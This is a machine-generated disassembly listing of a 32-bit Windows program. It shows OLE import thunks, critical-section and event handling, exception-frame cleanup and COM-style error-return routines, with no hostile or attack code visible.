CoTaskMemFree
jmp [ __import_lookup_table_12(ole32:CoTaskMemFree) ]
StgCreateDocfileOnILockBytes
jmp [ StgCreateDocfileOnILockBytes@IAT ]
StgOpenStorageOnILockBytes
jmp [ StgOpenStorageOnILockBytes@IAT ]
OleInitialize
jmp [ __import_lookup_table_12(ole32:OleInitialize) ]
OleUninitialize
jmp [ __import_lookup_table_12(ole32:OleUninitialize) ]
OleLoad
jmp [ OleLoad@IAT ]
OleSave
jmp [ __import_lookup_table_12(ole32:OleSave) ]
OleSetContainedObject
jmp [ __import_lookup_table_12(ole32:OleSetContainedObject) ]
OleSetMenuDescriptor
jmp [ __import_lookup_table_12(ole32:OleSetMenuDescriptor) ]
OleDraw
jmp [ __import_lookup_table_12(ole32:OleDraw) ]
IsAccelerator
jmp [ __import_lookup_table_12(ole32:IsAccelerator) ]
OleGetIconOfClass
jmp [ __import_lookup_table_12(ole32:OleGetIconOfClass) ]
CreateILockBytesOnHGlobal
jmp [ __import_lookup_table_12(ole32:CreateILockBytesOnHGlobal) ]
CreateStreamOnHGlobal
jmp [ __import_lookup_table_12(ole32:CreateStreamOnHGlobal) ]
SysFreeString
jmp [ __import_lookup_table_13(oleaut32:SysFreeString) ]
GetErrorInfo
jmp [ GetErrorInfo@IAT ]
sub_414ab5
jmp sub_403a3c
sub_414abc
pop ebp
retn
sub_414ac0
sub [ rw-data ] 0x1
retn
sub_415dab
add [ esp + 0x4 ] 0xffffffd8
jmp sub_41d868
sub_415db5
add [ esp + 0x4 ] 0xffffffd8
jmp sub_41d888
sub_415dbf
add [ esp + 0x4 ] 0xffffffd4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_41612c
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_416250
mov eax [ eax + 0xc ]
call sub_417414
retn
sub_416527
jmp sub_403a3c
sub_41652e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416534
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4175cc
test eax eax
setge al
pop esi
pop ebx
retn
sub_416837
jmp sub_403a3c
sub_41683e
mov esp ebp
pop ebp
retn
sub_41690c
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_416918
push ebx
mov ebx edx
mov edx ebx
call sub_41672c
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_41648c
sub_4169c4
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_416b1f
jmp sub_403a3c
sub_416bf3
jmp sub_403a3c
sub_416c04
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_416c70
jmp sub_403a3c
sub_416c77
pop ebx
mov esp ebp
pop ebp
retn
sub_416cc2
jmp sub_403a3c
sub_416cc9
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_416d55
jmp sub_403a3c
sub_416d5c
pop ebx
pop ebp
retn
sub_416da2
jmp sub_403a3c
sub_416da9
pop ebx
pop ebp
retn
sub_416dee
jmp sub_403a3c
sub_416df5
pop ebx
pop ebp
retn
sub_416e3f
jmp sub_403a3c
sub_416e46
pop esi
pop ebx
pop ebp
retn
sub_416e9a
jmp sub_403a3c
sub_416ea1
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_416fce
jmp sub_403a3c
sub_4170a4
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_4176b4
sub_417194
jmp sub_403a3c
sub_41731e
jmp sub_403a3c
sub_417325
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4173bf
jmp sub_403a3c
sub_4173c6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4173e5
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_4173de
jmp sub_403a3c
sub_4173e5
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_417448
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_417710
xor edx edx
mov eax ebx
call sub_4176d4
pop ebx
retn
sub_4174c0
mov eax [ ebp + 0x4 ]
retn
sub_4174f6
pop ecx
pop edx
pop esi
pop ebx
retn
sub_417544
jmp sub_403a3c
sub_41754b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417550
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_417568
xor edx edx
call sub_417570
retn
sub_417658
mov edx [ eax + 0x8 ]
dec edx
call sub_417570
retn
sub_417780
retn
sub_41783a
jmp sub_403a3c
sub_417841
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40365c
sub_4178d0
jmp sub_403a3c
sub_4178d7
pop ebx
pop ecx
pop ebp
retn
sub_4178dc
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_417933
jmp sub_403a3c
sub_41793a
pop ebx
pop ecx
pop ebp
retn
sub_417940
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41797c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
retn
sub_417994
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_417a6f
retn
sub_417b14
test edx edx
je r-xdata
xor edx edx
call sub_417b28
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_417bde
jmp sub_403a3c
sub_417be5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417bf8
xchg edx eax
call sub_417b28
retn
sub_417c00
retn
sub_417c99
jmp sub_403a3c
sub_417ca0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417dea
jmp sub_403a3c
sub_417efa
jmp sub_403a3c
sub_417f01
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417f1e
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_417f17
jmp sub_403a3c
sub_417f1e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417fa8
jmp sub_403a3c
sub_417fc0
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_41807c
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_418125
jmp sub_403a3c
sub_41812c
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418138
mov eax [ ebp + 0x4 ]
retn
sub_41816e
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4181bc
jmp sub_403a3c
sub_4181c3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418282
jmp sub_403a3c
sub_418289
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4182ab
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40405c
retn
sub_4182a4
jmp sub_403a3c
sub_4182ab
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4182b4
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_4182bc
xor eax eax
retn
sub_418305
jmp sub_403a3c
sub_41830c
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41841f
jmp sub_403a3c
sub_418426
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4184bb
jmp sub_403a3c
sub_4184c2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418540
jmp sub_403a3c
sub_418547
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418617
jmp sub_403a3c
sub_41861e
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4186d4
jmp sub_403a3c
sub_4186db
pop esi
pop ecx
pop ebp
retn
sub_418760
jmp sub_403a3c
sub_418767
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418784
lea eax [ ebp - 0x8 ]
call sub_404038
retn
sub_41877d
jmp sub_403a3c
sub_418784
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418810
jmp sub_403a3c
sub_41882d
jmp sub_403a3c
sub_418834
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418870
retn
sub_4188f3
jmp sub_403a3c
sub_4188fa
mov eax [ ebp - 0x8 ]
call sub_41b530
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41891f
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_418918
jmp sub_403a3c
sub_41891f
mov esp ebp
pop ebp
retn
sub_41896f
jmp sub_403a3c
sub_418976
pop esi
pop ecx
pop ebp
retn
sub_4189c9
jmp sub_403a3c
sub_4189d0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4189d8
retn
sub_418a53
jmp sub_403a3c
sub_418a5a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418af7
jmp sub_403a3c
sub_418afe
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418b1b
lea eax [ ebp - 0x8 ]
call sub_404038
retn
sub_418b14
jmp sub_403a3c
sub_418b1b
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418b20
retn
sub_418bc0
jmp sub_403a3c
sub_418bc7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418c46
jmp sub_403a3c
sub_418c4d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418c54
mov eax edx
mov edx ecx
call sub_408064
retn
sub_418c60
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_418c78
sub_418cf0
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_418d60
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_418d7c
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_418f70
mov eax [ eax + 0x18 ]
retn
sub_418f74
mov eax [ eax + 0x14 ]
retn
sub_419010
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_41921c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_4027ac
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_419258
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_419270
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_419284
mov edx sub_419270
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_4192cc
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_408064
retn
mov eax edx
mov edx ecx
call sub_40802c
retn
sub_419368
retn
sub_419660
jmp sub_403a3c
sub_419667
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4196c8
jmp sub_403a3c
sub_4196cf
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_419714
mov eax [ eax + 0x4 ]
call sub_4085dc
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_419724
mov eax [ eax + 0x4 ]
call sub_408608
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_419760
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_419909
jmp sub_403a3c
sub_419968
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_4199f8
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_419a48
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_419c83
jmp sub_403a3c
sub_419c8a
mov esp ebp
pop ebp
retn
sub_419d34
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
retn
sub_419dbc
mov [ eax + 0x18 ] edx
retn
sub_419f38
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_413fb4
retn
sub_419fbf
jmp sub_403a3c
sub_419fc6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a072
jmp sub_403a3c
sub_41a079
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a100
or eax 0x8b08458b
inc eax
clc
mov edx ebx
call sub_417414
pop ebx
pop ebp
retn
sub_41a21d
jmp sub_403a3c
sub_41a26f
jmp sub_403a3c
sub_41a28e
jmp sub_403a3c
sub_41a295
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a2b4
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41a2ad
jmp sub_403a3c
sub_41a2b4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a357
jmp sub_403a3c
sub_41a3df
jmp sub_403a3c
sub_41a3ec
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
pop ebx
retn
sub_41a404
mov eax [ rw-data ]
call sub_41a3ec
retn
sub_41a43c
push ebx
call sub_413e6c
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41a404
sub_41a5a9
jmp sub_403a3c
sub_41a5b0
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_404038
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_41a6d0
jmp sub_403a3c
sub_41a6d7
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41a7ce
jmp sub_403a3c
sub_41a7eb
jmp sub_403a3c
sub_41a7f2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a8f0
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_4192e8
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_41a9b4
push ebx
mov ebx eax
mov eax ebx
call sub_41c368
cmp al 0x9
sete al
pop ebx
retn
sub_41aa13
jmp sub_403a3c
sub_41aa1a
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41aac0
jmp sub_403a3c
sub_41aac7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41ad46
jmp sub_403788
sub_41ad72
jmp sub_403788
sub_41ae14
jmp sub_403788
sub_41aeb7
jmp sub_403788
sub_41b08f
jmp sub_403788
sub_41b0d1
jmp sub_403a3c
sub_41b101
jmp sub_403a3c
sub_41b108
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b177
jmp sub_403a3c
sub_41b24e
jmp sub_403a3c
sub_41b255
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b528
mov dl 0x1
call sub_41a490
retn
sub_41b660
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_41b669
jmp sub_403a3c
j_sub_41b660
jmp sub_41b660
sub_41b670
pop ebx
mov esp ebp
pop ebp
retn
sub_41b678
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41c478
mov eax [ rw-data ]
call sub_41a3ec
pop ebp
retn
j_sub_4038b4#5
jmp sub_4038b4
j_sub_4038b4#4
jmp sub_4038b4
sub_41b864
jmp sub_403a3c
sub_41b94b
jmp sub_403a3c
sub_41b952
mov esp ebp
pop ebp
retn
sub_41ba0a
jmp sub_403a3c
sub_41ba11
pop ecx
pop ecx
pop ebp
retn
sub_41bd13
jmp sub_403a3c
sub_41bd1a
pop ebx
mov esp ebp
pop ebp
retn
sub_41bfbf
jmp sub_403a3c
sub_41bfc6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_4032e8
retn
sub_41bfdf
jmp sub_403a3c
sub_41c003
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_403788
sub_41c03a
jmp sub_403788
sub_41c079
jmp sub_403a3c
sub_41c080
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c0a2
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_40405c
retn
sub_41c09b
jmp sub_403a3c
sub_41c0a2
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c129
jmp sub_403788
sub_41c156
jmp sub_403a3c
sub_41c15d
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c168
push ecx
mov edx esp
mov ecx 0x4
call sub_41a92c
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_41a3ec
sub_41c275
jmp sub_403a3c
sub_41c27c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c35b
jmp sub_403a3c
sub_41c362
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c3b8
jmp sub_403a3c
sub_41c3bf
pop ebx
pop ecx
pop ebp
retn
sub_41c607
jmp sub_403a3c
sub_41c60e
pop ecx
pop ecx
pop ebp
retn
sub_41c651
jmp sub_403a3c
sub_41c658
pop ebx
pop ecx
pop ebp
retn
sub_41c6f4
jmp sub_403a3c
sub_41c6fb
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c7a9
jmp sub_403a3c
sub_41c7b0
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c7bc
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_41ca17
jmp sub_403a3c
sub_41ca1e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ca43
mov eax [ ebp - 0x8 ]
call sub_4032e8
mov eax [ ebp - 0x4 ]
call sub_4032e8
retn
sub_41ca3c
jmp sub_403a3c
sub_41ca43
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ca68
lea eax [ ebp - 0x1c ]
call sub_405928
lea eax [ ebp - 0x18 ]
call sub_404038
retn
sub_41ca61
jmp sub_403a3c
sub_41ca68
pop ebx
mov esp ebp
pop ebp
retn
sub_41cc7a
jmp sub_403a3c
sub_41cc81
pop ebx
mov esp ebp
pop ebp
retn
sub_41ccd4
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_41954c
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_41ccec
test dl dl
je r-xdata
mov dl 0x8
call sub_41ce70
retn
mov dl 0x9
call sub_41ce70
retn
sub_41cd74
mov dl 0x1
call sub_41ce70
retn
sub_41cd7c
xor edx edx
call sub_41ce70
retn
sub_41ce61
jmp sub_403a3c
sub_41ce68
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41ce84
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40cc30
sub_41ceb8
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_41ced0
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_41cedc
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_41ced0
sub_41d002
jmp sub_403788
sub_41d031
jmp sub_403a3c
sub_41d067
jmp sub_403a3c
sub_41d06e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d08d
push rw-data
call LeaveCriticalSection
retn
sub_41d086
jmp sub_403a3c
sub_41d08d
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d15c
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_41d338
sub_41d1bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41b478
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_41d1d0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41b478
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_41d1e4
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41cd00
retn
sub_41d1f0
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41cd00
retn
sub_41d498
xor eax eax
retn
sub_41d49c
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41d4a4
xor eax eax
retn
sub_41d4a8
retn
sub_41d4ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40408c
pop esi
pop ebx
retn
sub_41d4c0
mov eax [ eax + 0x4 ]
retn
sub_41d4c4
retn
sub_41d4c8
xor eax eax
retn
sub_41d4cc
retn
sub_41d4d0
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_41d4dc
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_41d4e8
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_41d4f4
retn
sub_41d4f8
xchg edx eax
call sub_41b11c
retn
sub_41d500
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_41d588
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_4034e4
pop esi
retn
sub_41d59c
retn
sub_41d67c
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_40408c
pop esi
pop ebx
retn
sub_41d6bc
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_41d808
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_403530
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_41d820
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_41d8a8
retn
sub_41d8f0
retn
sub_41d928
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41d940
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41db64
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_4034e4
pop esi
pop ebx
retn
sub_41d988
mov al 0x1
retn
sub_41d98c
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41d994
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_41da3c
xor eax eax
retn
sub_41da40
retn
sub_41da6c
retn
sub_41db04
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_41db18
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_417414
retn
sub_41dc5f
jmp sub_403788
sub_41dc64
mov ebx 0x1
call sub_403af0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41dcc7
jmp sub_403788
sub_41dccc
mov ebx 0x80030103
call sub_403af0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41dd4a
jmp sub_403788
sub_41dd4f
mov ebx 0x80030009
call sub_403af0
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_41ddad
jmp sub_403788
sub_41ddb2
mov ebx 0x8000ffff
call sub_403af0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41df7d
jmp sub_403a3c
sub_41df8e
jmp sub_403788
sub_41df93
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403af0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dfbc
lea eax [ ebp + 0xc ]
call sub_405928
retn
sub_41dfb5
jmp sub_403a3c
sub_41dfbc
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_41dfc8
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_41dfd4
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_41dfe0
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41dfec
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41e05b
jmp sub_403788
sub_41e060
mov esi 0x8000ffff
call sub_403af0
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41e074
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_41e0e1
jmp sub_403a3c
sub_41e0e8
mov eax [ rw-data ]
call sub_4032e8
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41e0f8
call sub_416d60
retn
sub_41e1c0
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_41e364
jmp sub_403a3c
sub_41e36b
pop ebp
retn
sub_41e3f9
jmp sub_403a3c
sub_41e400
pop ebp
retn
sub_41e721
jmp sub_403a3c
sub_41e728
pop ebp
retn
sub_41e72c
sub [ rw-data ] 0x1
retn
sub_41ebe2
add al bh
0x70041 0x4708
sub_41f111
add eax 0xffffffd8
jmp sub_423434
sub_41f119
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_41f384
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
hlt
sub_41f6dc
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_41f750
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_41f7c4
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_41f7d0
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41f8b0
jmp sub_403a3c
sub_41f8b7
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f947
jmp sub_403a3c
sub_41f9d9
jmp sub_403a3c
sub_41f9e0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41fa44
jmp sub_403a3c
sub_41fa4b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41fab3
jmp sub_403a3c
sub_41faba
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41fb5d
jmp sub_403a3c
sub_41fb64
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ffbc
push 0x33
mov ecx rw-data
call sub_417020
retn
sub_41ffcc
push 0x33
mov ecx rw-data
call sub_416fe0
retn
sub_41ffdc
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_420000
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_4201d4
push 0x11
mov ecx rw-data
call sub_416fe0
retn
sub_420314
push ebx
mov ebx eax
mov eax ebx
call sub_41ffdc
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_4203ce
jmp sub_403a3c
sub_4203d5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_420000
retn
sub_4203eb
jmp sub_403a3c
sub_420404
push esi
push edi
